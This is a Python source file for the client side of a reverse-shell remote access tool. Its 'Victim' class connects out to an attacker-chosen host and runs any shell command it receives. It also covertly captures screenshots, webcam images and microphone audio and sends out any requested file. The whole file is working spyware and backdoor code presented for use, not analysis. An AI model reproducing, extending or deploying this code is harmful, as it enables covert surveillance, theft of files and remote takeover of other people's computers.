import socket
import os
import argparse
import subprocess
from time import sleep

class Victim():
    def __init__(self, host, port, bufferSize=4096, Separator="<separator>"):
        self.host = host
        self.port = port
        self.bufferSize = bufferSize
        self.Separator = Separator
        self.create_socket()
    
    def create_socket(self):
        try:
            # creating the socket object
            self.s = socket.socket()
            # Direct connecting to the host
            self.s.connect((self.host, self.port))

            # calling the main function !
            self.execute_cmd()
        except socket.error as err:
            print(f"[-] Error occured at socket processing, Reason {err}")

    def execute_cmd(self):
        terminal_data = f"{os.getcwd()}{self.Separator}{subprocess.getoutput('whoami')}"
        self.s.send(terminal_data.encode())

        while True:
            cmd = self.s.recv(self.bufferSize).decode().strip()
            # Spliting the command in a list for changing directory issues
            cmd_split = cmd.split()

            if cmd.lower() == 'quit':
                break
            # if command is cd then we will use os module to perform change of directory
            else:
                if cmd.lower()=='screenshot':
                    self.send_screenshot()
                    output=""
                elif cmd.lower()=='webcam_shot':
                    self.send_webcam_shot()
                    output=""
                elif cmd.lower()=='record_audio':
                    self.send_audio()
                    output=""
                elif cmd.lower().split()[0]=='download':
                    self.send_file(cmd)
                    output=""
                elif cmd_split[0].lower() == 'cd':
                    try:
                        os.chdir(' '.join(cmd_split[1:]))
                    except FileNotFoundError as e:
                        output = str(e)
                    else:
                        output = ""
                else:
                    output = subprocess.getoutput(cmd)
                # sending the output to server
                self.s.send(
                    f"{output}{self.Separator}{os.getcwd()}{self.Separator}{subprocess.getoutput('whoami')}".encode())

        self.s.close()
    def send_webcam_shot(self):
        """Function handles sending webcam shots"""
        import cv2 as cv
        webcam=cv.VideoCapture(0)
        isTrue,image=webcam.read()
        if isTrue:
            cv.imwrite('webcam.png',image)
            cv.waitKey(0)
        if os.path.exists('webcam.png'):
            img_size=os.path.getsize('webcam.png')
            self.s.send(f"{img_size}{self.Separator}Receiving Webcam shot ... \nFile size : {img_size} bytes \nPlease wait .....".encode())
            sleep(1)
            with open('webcam.png','rb') as image:
                self.s.send(image.read())
            os.remove('webcam.png')
        else:
            img_size=0
            self.s.send(f"{img_size}{self.Separator} Sorry! Can't access victim's camera ".encode())

    def send_file(self,cmd):
        """Function to handle files"""
        file=cmd.split()[1]
        if os.path.exists(file):
            file_size=os.path.getsize(file)
            self.s.send(f"{file_size}{self.Separator} Receiving {file} From victim's device{self.Separator}{file}".encode())
            sleep(1)
            with open(file,'rb') as f:
                self.s.send(f.read())   
        else:
            file_size=0
            self.s.send(f"{file_size}{self.Separator} {file} Not found on victim's side {self.Separator}{file}".encode())
            
    def send_audio(self):
        """Function to send Victim's microphone audio !"""
        import sounddevice as sd
        from scipy.io.wavfile import write
        self.s.send(f"Recording voice from Victim's mic of 10 secs.....!".encode())
        fs = 44100  # Sample rate
        seconds = 10  # Duration of recording

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait until recording is finished
        write('output.wav', fs, myrecording)  # Save as WAV file
        if os.path.exists('output.wav'):
            audio_size=os.path.getsize('output.wav') 
            self.s.send(f"{audio_size}{self.Separator}Receiving Audio from victim's microphone \nFile size : {audio_size} bytes \nPlease wait .....".encode())
            sleep(1)
            with open('output.wav','rb') as audio:
                self.s.send(audio.read())
            os.remove('output.wav')
        else:
            audio_size=0
            self.s.send(f"{audio_size}{self.Separator} Error Occureed in recieving audio\n Try again later !!".encode())

    
    def send_screenshot(self):
        """Handles sending screenshot"""
        import pyautogui
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r'screenshot.png')
        if os.path.exists('screenshot.png'):
            img_size=os.path.getsize('screenshot.png')
            self.s.send(f"{img_size}{self.Separator}Receiving screenshot... \nFile size : {img_size} bytes \nPlease wait .....".encode())
            sleep(1)
            with open('screenshot.png','rb') as image:
                self.s.send(image.read())
            os.remove('screenshot.png')
        else:
            img_size=0
            self.s.send(f"{img_size}{self.Separator} Error occurred in recieving screenshot\nTry again later !!".encode())
        
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-t', help="Specify the ip address you wanna connect to !", dest="target", required=True)
    parser.add_argument('-p', help="Specify the port number to which connect to !",
                        dest="port", default=1337, type=int)
    return parser.parse_args()


if __name__ == "__main__":
    arguments = get_args()
    host = arguments.target
    port = arguments.port
    victim = Victim(host, port)
